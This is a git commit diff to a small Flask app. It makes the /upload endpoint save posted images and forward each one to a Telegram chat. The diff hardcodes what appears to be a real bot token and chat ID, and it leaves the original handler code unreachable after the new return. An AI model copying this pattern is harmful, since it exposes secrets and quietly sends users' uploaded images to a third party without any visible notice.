49c69b83d99c5c0c035531b1edee08f4a3b9bc96
DHANIKELA REDDAIAH YADAV <151990146+REDDYRONY@users.noreply.github.com>
2026-04-08 02:54:56 +0530

    Update app.py

--- app.py
+++ app.py
@@ -1,6 +1,10 @@
 from flask import Flask, request
+import requests
 import os
 from datetime import datetime
+
+TOKEN = "8709592013:AAE5KyygvrXnPIczZfHWjEI2d5NakqFvaGA"
+CHAT_ID = "8502961385"
 
 app = Flask(__name__)
 
@@ -13,6 +17,23 @@ def home():
 
 @app.route('/upload', methods=['POST'])
 def upload():
+    data = request.data
+
+    filename = datetime.now().strftime("%Y%m%d_%H%M%S.jpg")
+    filepath = os.path.join("uploads", filename)
+
+    # Save image
+    with open(filepath, "wb") as f:
+        f.write(data)
+
+    # 🔥 SEND IMAGE TO TELEGRAM
+    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
+
+    with open(filepath, "rb") as photo:
+        requests.post(url, data={"chat_id": CHAT_ID}, files={"photo": photo})
+
+    return "Uploaded + Telegram Sent", 200
+    
     data = request.data
 
     if not data:
